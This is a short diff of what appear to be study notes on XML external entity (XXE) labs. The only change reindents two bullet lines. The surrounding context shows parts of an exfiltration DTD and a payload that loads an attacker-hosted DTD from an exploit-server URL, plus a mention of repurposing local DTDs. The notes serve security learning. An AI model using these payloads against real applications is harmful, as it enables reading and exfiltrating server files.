@@ -1480,8 +1480,8 @@ Interfere with an application's processing of XML to view files on the applicati
      %eval;
      %exfil;
      ```
-  - Click "View exploit" > note the exploit URL
-  - Check Stock repeater modify the body param   
+   - Click "View exploit" > note the exploit URL
+   - Check Stock repeater modify the body param   
     `<!DOCTYPE foo [<!ENTITY % xxe SYSTEM "YOUR-DTD-URL"> %xxe;]>`
 9. Exploiting XXE to retrieve data by **repurposing a local DTD (Expert)**
    - reference an existing DTD file on the server and redefine an entity from it
